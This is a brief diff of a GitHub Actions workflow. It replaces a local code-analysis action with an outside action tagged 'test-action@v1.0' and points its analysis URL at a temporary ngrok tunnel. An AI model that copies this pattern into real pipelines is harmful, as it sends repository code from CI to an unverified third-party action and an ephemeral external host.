@@ -23,8 +23,8 @@ jobs:
           node-version: "18"
 
       # Use the custom analyze action
-      - name: Analyze code before deploy
-        uses: ./.github/actions/analyze-action
+      - name: Analyze Before Deploy
+        uses: Gameel-Allam/test-action@v1.0
         with:
           analysis_url: "https://71f2-156-198-47-249.ngrok-free.app/analyze"
 
